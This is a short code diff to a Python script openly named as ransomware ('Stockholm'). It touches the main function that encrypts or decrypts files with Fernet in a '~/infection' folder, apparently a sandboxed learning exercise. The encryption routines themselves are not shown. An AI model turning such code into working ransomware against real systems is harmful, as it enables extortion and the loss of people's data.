@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 from cryptography.fernet import Fernet
 from pathlib import Path
 import argparse
@@ -92,11 +93,12 @@ class RansomWare():
 def main():
     args = args_manager()
     Stockholm = RansomWare(args.reverse, args.silent)
+    infection_path = Path('~/infection').expanduser()
     if(args.reverse is None):
-        Stockholm.encrypt_files('~/infection')
+        Stockholm.encrypt_files(infection_path)
     else:
-        Stockholm.decrypt_files('~/infection')
-    return();
+        Stockholm.decrypt_files(infection_path)
+    return()
 
 
 if(__name__ == "__main__"):
